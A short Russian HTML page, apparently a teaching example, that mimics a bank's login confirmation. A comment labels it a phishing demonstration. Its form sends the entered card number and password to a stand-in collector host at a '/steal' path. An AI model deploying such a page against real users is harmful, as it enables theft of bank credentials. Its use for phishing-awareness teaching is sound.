<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <title>Подтверждение входа</title>
</head>
<body>
  <h1>Подтвердите вход в Демобанк</h1>
  <p>Для продолжения введите номер карты и пароль.</p>
  <!-- Учебный пример фишинга: страница выглядит как банк, но форма
       пароля отправляет данные на чужой домен collector.example.net.
       Настоящие фишинговые страницы публиковать нельзя. -->
  <form method="post" action="https://collector.example.net/steal">
    <label>Номер карты <input type="text" name="card"></label><br>
    <label>Пароль <input type="password" name="password"></label><br>
    <button type="submit">Подтвердить</button>
  </form>
</body>
</html>
